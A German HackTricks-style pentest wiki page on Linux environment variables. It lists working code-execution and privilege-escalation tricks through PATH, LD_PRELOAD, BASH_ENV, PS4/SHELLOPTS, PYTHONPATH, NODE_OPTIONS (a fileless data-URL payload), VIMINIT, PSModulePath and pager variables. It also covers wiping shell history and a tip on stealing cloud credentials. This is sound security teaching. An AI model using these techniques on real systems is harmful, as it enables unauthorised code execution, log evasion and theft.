# Linux-Umgebungsvariablen

{{#include ../../banners/hacktricks-training.md}}

## Globale Variablen

Die globalen Variablen werden von **Kindprozessen** geerbt.

Du kannst eine globale Variable für deine aktuelle Sitzung erstellen mit:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

Diese Variable ist in deinen aktuellen Sitzungen und deren untergeordneten Prozessen verfügbar.

Du kannst eine Variable **entfernen**, indem du:

```bash
unset MYGLOBAL
```

## Lokale Variablen

Auf **lokale Variablen** kann nur von der **aktuellen Shell/dem aktuellen Skript** zugegriffen werden.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## Aktuelle Variablen auflisten

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

Die Inhalte von `/proc/*/environ` sind **NUL-separiert**, daher sind diese Varianten meist leichter zu lesen:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

Wenn du in geerbten Umgebungen nach **Zugangsdaten** oder **interessanten Dienstkonfigurationen** suchst, sieh dir auch [Linux Post Exploitation](../post-exploitation/README.md) an.

## Häufige Variablen

Quelle: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – das von **X** verwendete Display. Diese Variable ist normalerweise auf **:0.0** gesetzt, was bedeutet, dass das erste Display auf dem aktuellen Computer verwendet wird.
- **EDITOR** – der bevorzugte Texteditor des Benutzers.
- **HISTFILESIZE** – die maximale Anzahl der Zeilen in der History-Datei.
- **HISTSIZE** – Anzahl der Zeilen, die der History-Datei hinzugefügt werden, wenn der Benutzer seine Sitzung beendet.
- **HOME** – dein Home-Verzeichnis.
- **HOSTNAME** – der Hostname des Computers.
- **LANG** – deine aktuelle Sprache.
- **MAIL** – der Speicherort der Mail-Spool des Benutzers. Normalerweise **/var/spool/mail/USER**.
- **MANPATH** – die Liste der Verzeichnisse, in denen nach Handbuchseiten gesucht wird.
- **OSTYPE** – der Typ des Betriebssystems.
- **PS1** – der Standard-Prompt in bash.
- **PATH** – enthält die Pfade aller Verzeichnisse, in denen sich Binärdateien befinden, die du ausführen möchtest, indem du nur den Dateinamen angibst und keinen relativen oder absoluten Pfad.
- **PWD** – das aktuelle Arbeitsverzeichnis.
- **SHELL** – der Pfad zur aktuellen Befehls-Shell (zum Beispiel **/bin/bash**).
- **TERM** – der aktuelle Terminaltyp (zum Beispiel **xterm**).
- **TZ** – deine Zeitzone.
- **USER** – dein aktueller Benutzername.

## Interessante Variablen fürs Hacking

Nicht jede Variable ist gleich nützlich. Aus offensiver Sicht solltest du Variablen priorisieren, die **Suchpfade**, **Startup-Dateien**, das **Verhalten des dynamischen Linkers** oder **Auditing/Protokollierung** ändern.

### **HISTFILESIZE**

Ändere den **Wert dieser Variable auf 0**, damit die **History-Datei** (\~/.bash_history) beim **Beenden deiner Sitzung** auf **0 Zeilen gekürzt** wird.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

Ändere den **Wert dieser Variable auf 0**, damit Befehle **nicht im Verlauf im Arbeitsspeicher gespeichert** und nicht in die **Verlaufsdatei** (\~/.bash_history) zurückgeschrieben werden.

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

Wenn der **Wert dieser Variable auf `ignorespace` oder `ignoreboth` gesetzt ist**, wird jeder Befehl, dem ein zusätzliches Leerzeichen vorangestellt ist, nicht im Verlauf gespeichert.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

Setze die **Verlaufsdatei** auf **`/dev/null`** oder hebe die Variable vollständig auf. Das ist in der Regel zuverlässiger, als nur die Größe des Verlaufs zu ändern.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

Die Prozesse verwenden den hier angegebenen **Proxy**, um über **http oder https** eine Verbindung zum Internet herzustellen.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: Standard-Proxy für Tools/Protokolle, die ihn berücksichtigen.
- `no_proxy`: Umgehungsliste (Hosts/Domains/CIDRs), die direkt verbunden werden sollen.

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

Sowohl Klein- als auch Großbuchstaben können je nach Tool verwendet werden (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Die Prozesse vertrauen den Zertifikaten, die in **diesen Umgebungsvariablen** angegeben sind. Dies ist nützlich, damit Tools wie **`curl`**, **`git`**, Python-HTTP-Clients oder Paketmanager einer vom Angreifer kontrollierten CA vertrauen (zum Beispiel, damit ein Interception-Proxy legitim aussieht).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

Wenn ein privilegierter Wrapper oder ein privilegiertes Skript Befehle **ohne absolute Pfade** ausführt, wird das **erste vom Angreifer kontrollierte Verzeichnis** in `PATH` verwendet. Das ist die Grundlage vieler **PATH-Hijacks** in `sudo`, Cron-Jobs, Shell-Wrappern und benutzerdefinierten SUID-Hilfsprogrammen. Achte auf `env_keep+=PATH`, einen schwachen `secure_path` oder Wrapper, die `tar`, `service`, `cp`, `python` usw. nur über ihren Namen aufrufen.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

Für vollständige Privilegieneskalationsketten, die `PATH` ausnutzen, siehe [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` ist nicht nur ein Verzeichnisverweis: Viele Tools laden automatisch **dotfiles**, **Plugins** und **benutzerspezifische Konfiguration** aus `$HOME` oder `$XDG_CONFIG_HOME`. Wenn ein privilegierter Workflow diese Werte beibehält, ist **config injection** möglicherweise einfacher als **binary hijacking**.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Interessante Ziele sind `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` und tool-spezifische Dateien wie `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Diese Variablen beeinflussen den **dynamischen Linker**:

- `LD_PRELOAD`: erzwingt, dass zusätzliche Shared Objects zuerst geladen werden.
- `LD_LIBRARY_PATH`: stellt Bibliothekssuchverzeichnisse an den Anfang der Suchreihenfolge.
- `LD_AUDIT`: lädt Auditor-Bibliotheken, die das Laden von Bibliotheken und die Symbolauflösung beobachten.

Sie sind äußerst wertvoll für **Hooking**, **Instrumentation** und **Privilege Escalation**, wenn ein privilegierter Befehl sie beibehält. Im **secure-execution**-Modus (`AT_SECURE`, z. B. bei setuid/setgid/Capabilities) entfernt oder beschränkt der Loader viele dieser Variablen. Parser-Bugs in dieser frühen Loader-Phase können jedoch weiterhin schwerwiegende Auswirkungen haben, da sie **vor** dem Zielprogramm ausgeführt werden.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` ändert das Verhalten von glibc in einer frühen Phase (zum Beispiel die Tunables des Allocators) und ist in Exploit-Labs sehr nützlich. Auch aus Sicherheitssicht ist die Variable relevant, da der **dynamic loader sie sehr früh parst**. Der **Looney-Tunables**-Bug von 2023 war eine gute Erinnerung daran, dass eine einzelne vom Loader geparste Umgebungsvariable zu einem **lokalen Privilege-Escalation-Primitiv** gegen SUID-Programme werden kann.<sup>[[6]](#references)</sup>

Vergleiche bei CVE-2023-4911 die **installierte Distributionspaket-Version** mit der vom Anbieter korrigierten Version und überprüfe, welcher Loader tatsächlich für neue Prozesse verwendet wird. Eine Upstream-Versionsnummer allein ist unzuverlässig: Debian hat den anfälligen Parser in sein 2.31-Paket zurückportiert, während Distributionen Korrekturen zurückportiert haben, ohne die Upstream-Nummer zu ändern. Für einen tatsächlichen Privilege-Übergang ist außerdem ein ausführbares privilegiertes Ziel erforderlich, dessen Identitätswechsel nicht durch `NoNewPrivs`, einen `nosuid`-Mount oder eine andere Mitigation blockiert wird. Vermeide es, während passiver Enumeration eine fehlerhafte `GLIBC_TUNABLES`-Crash-Probe auszuführen. Informationen zur versionsspezifischen Anwendbarkeit findest du im [Ubuntu-Tracker](https://ubuntu.com/security/CVE-2023-4911), im [Debian-Tracker](https://security-tracker.debian.org/tracker/CVE-2023-4911) und in der [Red-Hat-Sicherheitsempfehlung](https://access.redhat.com/security/cve/cve-2023-4911); Ubuntus [Sicherheitshinweis](https://ubuntu.com/security/notices/USN-6409-1) empfiehlt nach dem Update außerdem einen Neustart.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

Wird **Bash** **nicht interaktiv** gestartet, prüft es `BASH_ENV` und lädt diese Datei ein, bevor es das Zielskript ausführt. Wird Bash als `sh` oder im interaktiven POSIX-Modus aufgerufen, kann auch `ENV` berücksichtigt werden. Das ist eine klassische Methode, um einen Shell-Wrapper in Code-Ausführung zu verwandeln, wenn die Umgebung vom Angreifer kontrolliert wird.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash ignoriert diese Startdateien, wenn sich die **realen und effektiven IDs unterscheiden**; `-p` behält die effektive ID bei, aktiviert diese Startdateien aber nicht. Das genaue Verhalten hängt also davon ab, wie der Wrapper die Shell startet. Vorsicht bei privilegierten Wrappern, die vor dem Start von Bash `setuid()`/`setgid()` aufrufen: Sobald die IDs wieder übereinstimmen, vertraut Bash möglicherweise `BASH_ENV`, `ENV` und ähnlichen Shell-Zuständen, die es andernfalls ignorieren würde.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Wenn Bash mit aktiviertem **xtrace** läuft, erweitert es `PS4` und gibt es vor jedem nachverfolgten Befehl aus. `PS4` wird wie ein Prompt erweitert, daher wird eine darin enthaltene **Befehlssubstitution** ausgeführt. Entscheidend ist, dass sich xtrace allein über die Umgebung aktivieren lässt, indem `SHELLOPTS=xtrace` exportiert wird — auf der Kommandozeile ist kein `-x` erforderlich. Dadurch wird jedes Bash-Skript, das das Opfer ausführt, zu einer Möglichkeit für Codeausführung.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` bewirkt nichts, bis xtrace aktiv ist (`SHELLOPTS=xtrace`, `set -x` oder `bash -x`). In privilegierten/setuid-Kontexten verwirft Bash `SHELLOPTS` genauso wie `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Diese Variablen ändern, wie Python gestartet wird:

- `PYTHONPATH`: Import-Suchpfade voranstellen.
- `PYTHONHOME`: Den Standardbibliotheksbaum verlagern.
- `PYTHONSTARTUP`: Eine Datei vor der interaktiven Eingabeaufforderung ausführen.
- `PYTHONINSPECT=1`: Nach Ende eines Skripts in den interaktiven Modus wechseln.
- `PYTHONBREAKPOINT`: `package.module.callable` wird aufgerufen (und sein Modul importiert), wenn der Code `breakpoint()` erreicht.<sup>[[8]](#references)</sup>

Sie sind nützlich bei Wartungsskripten, Debuggern, Shells und Wrappers, die Python mit einer kontrollierbaren Umgebung aufrufen. `python -E` und `python -I` ignorieren alle `PYTHON*`-Variablen.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

Ein aktuelles Beispiel aus der Praxis war die **needrestart**-LPE von 2024 auf Ubuntu-/Debian-Systemen: Der Scanner mit Root-Rechten kopierte das `PYTHONPATH` eines unprivilegierten Prozesses aus `/proc/<PID>/environ` und führte dann Python aus. Der veröffentlichte Exploit platzierte `importlib/__init__.so` im vom Angreifer kontrollierten Pfad, sodass Python während seiner eigenen Initialisierung Angreifercode ausführte, noch bevor das fest codierte Skript des Hilfsprogramms überhaupt relevant wurde.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl verfügt über ebenso nützliche Startvariablen:

- `PERL5LIB`: Bibliotheksverzeichnisse voranstellen.
- `PERL5OPT`: Schalter einschleusen, als stünden sie auf jeder `perl`-Befehlszeile.

Dadurch kann **automatisches Laden von Modulen** erzwungen oder das Verhalten des Interpreters geändert werden, bevor das Zielskript etwas Interessantes tut. Perl ignoriert diese Variablen in **taint- / setuid- / setgid**-Kontexten, aber sie sind für normale Wrapper mit Root-Rechten, CI-Jobs, Installer und benutzerdefinierte sudoers-Regeln weiterhin sehr relevant.

Wenn eine sudo-Regel Umgebungsvariablen überschreiben lässt und der privilegierte Befehl letztlich Perl startet, prüfe auch `PERL5DB`. Perl dokumentiert, dass `PERL5OPT=-d` den Debugger startet und `PERL5DB` Debugger-Initialisierungscode bereitstellt, wenn Perl mit einem alleinstehenden `-d`-Schalter gestartet wird. Nur `PERL5LIB` und `PERLLIB` zu entfernen, beseitigt diesen Angriffsweg nicht. Die Variablen müssen sudo und den Wrapper überstehen, und der Perl-Prozess darf sie nicht aufgrund von taint- oder Set-ID-Behandlung ignorieren. Prüfe bei der Enumeration die genaue Regel und Ausführungskette, ohne das privilegierte Hilfsprogramm auszuführen. Siehe die [Referenz zu Umgebungsvariablen in perlrun](https://perldoc.perl.org/perlrun#ENVIRONMENT).

Der integrierte [`@INC`-Suchpfad](https://perldoc.perl.org/perlvar#@INC) von Perl ist auch ohne beibehaltene Umgebungsvariablen eine weitere Vertrauensgrenze für Module. Stelle bei einem privilegierten Perl-Prozess einen tatsächlichen `use`- oder `require`-Befehl dem aufgelösten Modulnamen, der Suchreihenfolge und der Möglichkeit eines Benutzers mit geringeren Rechten gegenüber, das betreffende Modul in einem durchsuchten Verzeichnis anzulegen oder zu ersetzen. Ein beschreibbares Bibliotheksverzeichnis allein belegt nicht, dass der privilegierte Prozess daraus Code laden wird.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS` stellt **Node.js-CLI-Flags** jedem `node`-Prozess voran, der die Umgebung erbt. Dadurch ist es nützlich gegen Wrapper, CI-Jobs, Electron-Helfer und sudo-Regeln, die letztendlich Node aufrufen. Die interessantesten Flags für Angriffe sind meist:

- `--require <file>`: lädt eine CommonJS-Datei vor dem Zielskript.
- `--import <module>`: lädt ein ES-Modul vor dem Zielskript.

Node weist einige gefährliche Flags in `NODE_OPTIONS` zurück, aber `--require` und `--import` sind ausdrücklich erlaubt und werden **vor** den regulären Befehlszeilenargumenten verarbeitet.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### Dateiloses Preload mit einer `data:`-URL

Wenn du `NODE_OPTIONS` setzen kannst, aber **keine Datei** auf dem Ziel schreiben kannst (schreibgeschütztes Dateisystem, eingeschränkte API, Serverless-Laufzeit usw.), akzeptiert `--import` eine `data:text/javascript,`-URL, sodass die gesamte Payload direkt in der Umgebungsvariablen enthalten ist. Das JavaScript muss **vollständig URL-kodiert** sein – Node interpretiert den Wert als URL, daher kürzt jedes nicht kodierte Leerzeichen (oder andere nicht kodierte Zeichen) die Payload ab und löst einen `SyntaxError` aus. Das funktioniert ab Node 20.6, wo `--import` auf der `NODE_OPTIONS`-Allowlist steht.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> Dies ist eine gängige Methode, um die Kontrolle über `NODE_OPTIONS` in RCE auf **verwalteten Cloud-Runtimes** umzuwandeln, deren Funktionen Node ausführen. Beispielsweise kann ein Angreifer, der nur die Konfiguration einer Lambda-Funktion ändern kann (`lambda:UpdateFunctionConfiguration`, kein `iam:PassRole`, keine Codeänderung), `NODE_OPTIONS=--import data:text/javascript,<payload>` einschleusen, um Code innerhalb der Funktion auszuführen und die Anmeldedaten ihrer Execution Role zu stehlen. Das eingeschleuste Modul wird **vor** dem Handler ausgeführt, der danach weiterhin normal läuft.

Informationen zu Remote-Gadget-Chains, die `NODE_OPTIONS` indirekt setzen (zum Beispiel durch Prototype Pollution zu RCE), findest du auf [dieser anderen Seite](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby bietet dieselbe Art des Missbrauchs beim Start:

- `RUBYLIB`: Verzeichnisse dem Ruby-Ladepfad voranstellen.
- `RUBYOPT`: Kommandozeilenoptionen wie `-r` in jeden `ruby`-Aufruf einschleusen.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

Die **needrestart**-Schwachstellen von 2024 haben gezeigt, dass dies nicht nur ein Lab-Trick ist: Dasselbe root-eigene Hilfsprogramm, das für `PYTHONPATH`-Missbrauch anfällig war, konnte auch dazu gebracht werden, Ruby mit einem vom Angreifer kontrollierten `RUBYLIB` auszuführen und `enc/encdb.so` aus einem Angreiferverzeichnis zu laden.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim führen die in `VIMINIT` (oder dessen Fallback `EXINIT`) enthaltenen Ex-Befehle beim normalen Start aus. Zu den Ex-Befehlen gehören `:!cmd` und `:call system(...)`. Wer also die Variable kontrolliert, kann Code ausführen, sobald ein Opfer Vim öffnet (ein root-`sudo vim`, `crontab -e`, `visudo`, `git`/`less`, das `$EDITOR` startet usw.).<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Der Batch-Modus (`vim -es`/`-Es`) überspringt diese Variablen, beim normalen interaktiven Start werden sie jedoch ausgeführt.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) läuft unter Linux/macOS (und Windows) und ist eine **.NET-Anwendung**. Daher können mehrere Umgebungsvariablen jede `pwsh`-Ausführung mit geerbter Umgebung zur Codeausführung bringen – nützlich gegen cron/systemd-Jobs, CI-Runner und privilegierte Wrapper, die `pwsh` aufrufen.

- `PSModulePath`: PowerShell durchsucht jedes Verzeichnis in dieser Liste rekursiv nach `.psd1`-/`.psm1`-Modulen und **lädt eines automatisch**, sobald erstmals ein von ihm exportierter Befehl aufgerufen wird. Füge ein Verzeichnis am Anfang der Liste ein, und der Top-Level-Code deines Moduls wird beim Import ausgeführt. Da die Auflösung nach *Alias → Function → Cmdlet* erfolgt, kann eine exportierte Funktion sogar ein integriertes Cmdlet überschreiben, das das Opfer aufruft.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: verlagert `powershell/Microsoft.PowerShell_profile.ps1`, das beim Start ausgeführt wird (außer bei `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: verwaltete Assembly, deren `StartupHook.Initialize()` vor `Main` ausgeführt wird (wird von allen .NET-Apps verwendet).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: Die CLR Profiling API lädt beim Start eine Angreifer-Bibliothek in den Prozess (Pfadvariablen haben Vorrang vor der Registry; `DOTNET_*` ist der neuere Alias). Unter Windows PowerShell 5.1 (.NET Framework) verwende `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

Unter Windows entfernt `PSExecutionPolicyPreference=Bypass` zusätzlich die Schutzmaßnahme „unsigned scripts blocked“, sodass ein platzierter Profile/Modul tatsächlich ausgeführt wird. Die vollständigen PoCs findest du auf der entsprechenden Seite:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Einige Tools lesen nicht einfach nur einen Pfad aus der Umgebung aus, sondern übergeben den Wert an eine **Shell**, einen **Editor** oder einen **Input-Preprocessor**. Dadurch sind die folgenden Variablen besonders interessant, wenn ein privilegierter Wrapper `git`, `man`, `less` oder ähnliche Text-Viewer ausführt:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: Legen den Pager-Befehl fest.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: Legen den Editor-Befehl fest, oft mit Argumenten.
- `LESSOPEN`, `LESSCLOSE`: Legen Pre-/Post-Prozessoren fest, die beim Öffnen einer Datei durch `less` ausgeführt werden.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git unterstützt auch eine **reine Konfigurationsinjektion über Umgebungsvariablen**, ohne auf die Festplatte zuzugreifen, über `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` und `GIT_CONFIG_VALUE_<n>`:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

Aus Post-Exploitation-Sicht solltest du auch bedenken, dass geerbte Umgebungen oft **Anmeldedaten**, **Proxy-Einstellungen**, **Service-Tokens** oder **Cloud-Schlüssel** enthalten. Sieh dir [Linux Post Exploitation](../post-exploitation/README.md) an, um nach `/proc/<PID>/environ` und `systemd`-`Environment=` zu suchen.

### PS1

Ändere das Aussehen deines Prompts.

[**Dies ist ein Beispiel**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Dies ist ein Beispiel](<../images/image (897).png>)

Regulärer Benutzer:

![PERL5OPT & PERL5LIB - PS1: Ein, zwei und drei Jobs im Hintergrund](<../images/image (740).png>)

Ein, zwei und drei Jobs im Hintergrund:

![PERL5OPT & PERL5LIB - PS1: Ein, zwei und drei Jobs im Hintergrund](<../images/image (145).png>)

Ein Job im Hintergrund, einer angehalten und der letzte Befehl nicht korrekt beendet:

![PERL5OPT & PERL5LIB - PS1: Ein Job im Hintergrund, einer angehalten und der letzte Befehl nicht korrekt beendet](<../images/image (715).png>)

## References

- [1] [GNU-Bash-Handbuch - Bash-Startdateien](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPEs in needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js-CLI-Dokumentation - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Gängige Umgebungsvariablen - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Lokale Rechteausweitung in glibcs ld.so - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [GNU-Bash-Handbuch - Bash-Variablen (`PS4`) und das Set-Builtin (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Integrierter breakpoint() und PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Vim-Dokumentation - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath und automatisches Laden von PowerShell-Modulen](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Konfigurationseinstellungen für .NET-Debugging und -Profiling (`CORECLR_`/`DOTNET_`/`COR_`-Profiler-Variablen)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
